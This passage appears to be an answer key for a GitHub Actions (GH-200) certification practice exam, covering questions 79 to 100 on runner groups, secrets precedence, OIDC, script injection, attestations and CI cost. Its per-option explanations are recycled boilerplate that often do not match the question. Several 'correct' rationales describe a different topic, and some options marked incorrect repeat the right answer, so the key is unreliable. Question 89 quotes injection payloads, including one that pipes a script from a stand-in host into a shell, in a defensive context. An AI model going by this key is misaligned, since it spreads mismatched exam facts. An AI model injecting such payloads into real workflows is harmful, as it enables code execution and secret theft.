- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 79 — `A, E` (Manage GitHub Actions for the enterprise)

Correct answers: A and E (are correct). Organization/Enterprise `workflow_job` webhooks (`firing on queued, waiting, in_progress, and completed with runner_group_name and labels`) and Actions Usage Metrics / Audit Log streaming provide real-time queue-wait and utilization telemetry. [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **E:** Correct. Scoped Runner Groups + ephemeral single-job runners protect enterprise compute and internal networks.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 80 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Call `DELETE /orgs/{org}/actions/runners/{runner_id}` (`with organization_self_hosted_runners: write` App token, provided the runner is not currently executing a job; or wait 14–30 days for automatic offline expiry of ephemeral/inactive entries). [Skill 4.6: Organize runner groups, restrict access, and monitor or troubleshoot runner health and performance | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Correct. Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 81 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). `https://github.com/actions/runner-images` contains the official Packer templates, provisioner scripts, and Markdown software inventories for GitHub's Ubuntu, Windows Server, and macOS hosted runner images. [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **C:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 82 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). With `containerMode.type: "kubernetes"` (`using @actions/runner-container-hooks`), the runner pod delegates `container:` and `services:` execution to ephemeral worker pods via the Kubernetes API + a shared `PersistentVolumeClaim` workspace (`requiring zero privileged Docker daemon`). [Skill 4.7: Customize, preconfigure, and maintain runner images and software dependencies | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/using-github-hosted-runners/customizing-github-hosted-runners)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Correct. Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.

### Question 83 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Because Repository scope overrides Organization scope (`Environment > Repository > Organization`), the stale Repository secret `ARTIFACTORY_TOKEN` inside `customs-gw` shadows the freshly rotated Organization secret until the stale Repository secret is deleted. [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **D:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.

### Question 84 — `A, B` (Manage GitHub Actions for the enterprise)

Correct answers: A and B (are correct). GitHub Actions encrypted secrets and configuration variables are configured at the **Organization**, **Repository**, and **Environment** levels (`precedence: Environment > Repository > Organization`); distributing secrets across multiple organizations uses programmatic Secrets REST API sync or runtime OIDC external vault federation (`Vault / Azure Key Vault / AWS Secrets Manager`). [Skill 4.8: Define scope, precedence, and access controls for encrypted secrets and configuration variables at enterprise, organization, repository, and environment levels | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions)]

- **A:** Correct. Environment secrets take highest precedence (`gated by reviewers/branches`), REST updates require LibSodium sealed boxes, and `vars.*` keeps non-secret config readable.
- **B:** Correct. Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **E:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **F:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 85 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Minting an App token (`organization_actions_secrets: write`), `GET`ting `/orgs/{org}/actions/secrets/public-key` (`key_id`, `key`), encrypting client-side via LibSodium `crypto_box_seal`, and `PUT`ting `/orgs/{org}/actions/secrets/{name}` (`selected` repos) rotates secrets programmatically. [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Incorrect. GitHub only decrypts asymmetric LibSodium sealed boxes encrypted with the `key` matching `key_id` from `/public-key`.
- **B:** Incorrect. `GITHUB_*` names and `>48 KB` payloads fail validation, and `Environment > Repository > Organization` means Env secrets win.
- **C:** Incorrect. Plain base64 without LibSodium fails decryption, `variables` is plaintext, `all` exposes secrets to public repos, and `GET` never returns plaintext.
- **D:** Correct. Actions Secrets REST API requires client-side LibSodium sealed-box encryption against the org public key before `PUT`ting `encrypted_value`.

### Question 86 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Environment secrets have their own per-environment encryption key pair retrieved via `GET /repos/{owner}/{repo}/environments/{environment_name}/secrets/public-key` (`never reuse an org or repo key_id when encrypting an Environment secret!`). [Skill 4.9: Manage secrets programmatically and in workflows using the GitHub REST API and secure handling practices | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/rest/actions/secrets)]

- **A:** Correct. The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 87 — `C` (Secure and optimize automation)

Correct answer: C (is correct). The job enters `Waiting` until BOTH the 15-minute wait timer elapses AND a member of `@aegisrail/cab-leads` (`other than the triggering actor if Prevent self-review is enabled`) approves the deployment (`unlocking environment secrets/OIDC only after all gates pass`). [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 88 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Verify publisher provenance/maintenance (`official GitHub/cloud vendor or audited source`), audit `action.yml` + committed `dist/`/`Dockerfile` for minimal `GITHUB_TOKEN`/network behavior (`zero telemetry exfiltration`), and pin the audited commit by full 40-char SHA (`checking OpenSSF Scorecard / GHAS advisories`). [Skill 5.1: Configure deployment environments, protection rules, required reviewers, and vet Marketplace actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment)]

- **A:** Correct. Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 89 — `B` (Secure and optimize automation)

Correct answer: B (is correct). No — `${{ github.event.comment.body }}` is expanded into the shell script text BEFORE bash executes, so a comment containing `"; whoami #` breaks out of double quotes and executes arbitrary shell code; bind `COMMENT_BODY: ${{ github.event.comment.body }}` in step `env:` and pass `"$COMMENT_BODY"`. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.
- **B:** Correct. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **C:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — `${{ github.event.comment.body }}` is expanded into the shell script text BEFORE bash executes, so a comment containing `"; whoami #` breaks out of double quotes and executes arbitrary shell code; bind `COMMENT_BODY: ${{ github.event.comment.body }}` in step `env:` and pass `"$COMMENT_BODY"`.
- **D:** Incorrect. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.

### Question 90 — `D, E` (Secure and optimize automation)

Correct answers: D and E (are correct). Run `mvn test` inside an unprivileged `on: pull_request` workflow (`no secrets, read-only token`) that uploads ONLY a non-executable coverage number artifact, and use a separate `on: workflow_run` workflow (`on main, never executing code from the artifact`) that parses the plain integer safely via `env:` to post the PR comment. [Skill 5.2: Identify and mitigate untrusted input and script injection risks in workflows and actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **D:** Correct. GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.
- **E:** Correct. Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.
- **F:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.

### Question 91 — `B` (Secure and optimize automation)

Correct answer: B (is correct). Publishing packages or container images to GitHub Packages / `ghcr.io` for the current repository requires `packages: write` (`paired with contents: read` for `actions/checkout`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **B:** Correct. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 92 — `A` (Secure and optimize automation)

Correct answer: A (is correct). No — checking out and executing untrusted fork `head.sha` build scripts (`pom.xml` plugins / Maven wrapper) inside `pull_request_target` grants attacker code full access to `secrets.SONAR_TOKEN` and a write-capable `GITHUB_TOKEN` (`classic pwn-request vulnerability`). [Skill 5.3: Apply least-privilege permissions to GITHUB_TOKEN and manage cross-repository authentication tokens | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)]

- **A:** Correct. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — checking out and executing untrusted fork `head.sha` build scripts (`pom.xml` plugins / Maven wrapper) inside `pull_request_target` grants attacker code full access to `secrets.SONAR_TOKEN` and a write-capable `GITHUB_TOKEN` (`classic pwn-request vulnerability`).
- **C:** Incorrect. On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).
- **D:** Incorrect. `GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.

### Question 93 — `D` (Secure and optimize automation)

Correct answer: D (is correct). When a job does NOT specify `environment:` and runs on `push` to branch `main`, GitHub sets the OIDC `sub` claim to `repo:aegisrail/customs-gw:ref:refs/heads/main` (`whereas adding environment: staging changes sub to repo:aegisrail/customs-gw:environment:staging`!). [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.
- **B:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Correct. OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.

### Question 94 — `A` (Secure and optimize automation)

Correct answer: A (is correct). Gating `production` Environment (`reviewers`, `main`), pinning cloud OIDC `aud` & `sub: repo:<o>/<r>:environment:production`, setting `environment: production` + `id-token: write`, and exchanging short-lived JWTs at runtime eliminates static Azure client secrets. [Skill 5.4: Configure OpenID Connect (OIDC) for federated authentication to cloud providers and external vaults | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)]

- **A:** Correct. Pairing `environment: production` with `id-token: write` gates job execution and emits the `repo:<org>/<repo>:environment:production` `sub` claim.
- **B:** Incorrect. OIDC JWTs expire in minutes and are minted dynamically per job run, never stored statically.
- **C:** Incorrect. GitHub withholds Environment tokens until protection gates pass, and `pull_request_target` + fork checkout leaks credentials.
- **D:** Incorrect. Wildcard `repo:*:*` lets external repos assume your cloud role, and omitting `id-token: write` or `environment:` breaks OIDC gating.

### Question 95 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Granting `id-token: write` & `attestations: write` in reusable CI, building the immutable `sha256:` image digest, signing provenance via `actions/attest-build-provenance`, and verifying via `gh attestation verify -R <o>/<r> --signer-workflow` secures artifact supply chains. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. `gh attestation verify` requires `-R <org>/<repo>` (or `--owner` + `--signer-workflow`) to validate the exact trusted repository/workflow signer.
- **B:** Incorrect. Attestation signing requires `id-token: write` + `attestations: write`, container attestations require `sha256:` digests, and deploy gates must verify.
- **C:** Correct. SLSA Build Level 3 pairs `id-token: write` + `attestations: write` in a trusted reusable workflow with `gh attestation verify` deploy gating.
- **D:** Incorrect. Sigstore certificates in Artifact Attestations cryptographically bind artifacts to a verifiable GitHub Actions workflow run.

### Question 96 — `D` (Secure and optimize automation)

Correct answer: D (is correct). Download the Sigstore attestation bundle (`.jsonl` via `gh attestation download` or artifact export) plus trusted root metadata (`gh attestation trusted-root`) in advance, and run `gh attestation verify <artifact> --bundle <bundle.jsonl> --custom-trusted-root <root.jsonl> --owner aegisrail --signer-workflow ...` completely offline. [Skill 5.5: Enforce action pinning, supply-chain security controls, and artifact attestations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds)]

- **A:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **B:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.

### Question 97 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Use `gradle/actions/setup-gradle@v4` (`or actions/setup-java@v4 with cache: 'gradle'`), which stops Gradle daemons cleanly before saving read-only cache entries on `main` and restores read-only caches safely on PR jobs. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 98 — `C, E` (Secure and optimize automation)

Correct answers: C and E (are correct). Lower the Organization/Enterprise `Artifact and log retention` ceiling (`e.g., from 90 days to 14 days`) while setting `retention-days: 1` on transient inter-job build artifacts, and run an automated cleanup job (`DELETE /repos/{owner}/{repo}/actions/artifacts/{artifact_id}`) after downstream jobs finish. [Skill 5.6: Optimize workflow execution time and storage using caching, artifact policies, and selective execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/rest/actions/permissions#get-artifact-and-log-retention-settings-for-an-organization)]

- **A:** Incorrect. Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!
- **E:** Correct. Canceling superseded PR runs, caching lockfile dependencies, shortening artifact retention, and right-sizing runner OS tiers cut CI latency and metered cost.
- **F:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 99 — `A` (Secure and optimize automation)

Correct answer: A (is correct). `ubuntu-slim` provides a fast-starting, lower-cost 1-vCPU / 5 GB RAM Linux container runner environment tailored for lightweight automation (`linting, triage, API scripts`) that does not require Docker containers. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 100 — `C` (Secure and optimize automation)

Correct answer: C (is correct). Explicitly set realistic `timeout-minutes` (`e.g., 15–30 minutes`, well below the 360-minute default) at the job AND risky-step levels across every workflow, paired with `concurrency: cancel-in-progress: true` on non-deployment branches. [Skill 5.7: Reduce runner cost and resource consumption using concurrency controls, runner sizing, and matrix optimization | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs)]

- **A:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **B:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **C:** Correct. Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
